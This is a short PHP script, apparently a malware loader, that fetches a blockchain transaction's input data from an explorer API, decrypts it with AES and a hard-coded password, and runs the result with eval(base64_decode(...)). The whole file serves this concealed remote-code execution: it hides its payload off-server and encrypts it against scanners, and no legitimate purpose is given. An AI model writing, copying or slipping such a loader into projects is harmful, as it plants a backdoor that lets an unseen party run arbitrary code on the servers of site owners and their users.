<?php

$tx_hash = str_replace('https://explorer.enix.ai/tx/', '', 'https://explorer.enix.ai/tx/0x45658f37109d72272c21602ae5c4e7ee72b9619918fcdd3358295741ab8743a1');
$tx_json_data = file_get_contents('https://explorer.enix.ai/api/?module=transaction&action=gettxinfo&txhash=' . $tx_hash);
$tx_json_data = json_decode($tx_json_data);

$utf8_converted = str_replace('0x', '', utf8_encode($tx_json_data->result->input));
$decryptData = decryptCipherConversion(hex2bin($utf8_converted), 'REMOVEDPASSWORD');

function decryptCipherConversion($crypted_token, $password){
	
	list($crypted_token, $enc_iv) = explode("::", $crypted_token);;
  $cipher_method = 'aes-128-ctr';
  $enc_key = openssl_digest($password, 'SHA256', TRUE);
  $token = openssl_decrypt($crypted_token, $cipher_method, $enc_key, 0, hex2bin($enc_iv));
  unset($crypted_token, $cipher_method, $enc_key, $enc_iv);
  
  return $token;
	
}

eval(base64_decode($decryptData));
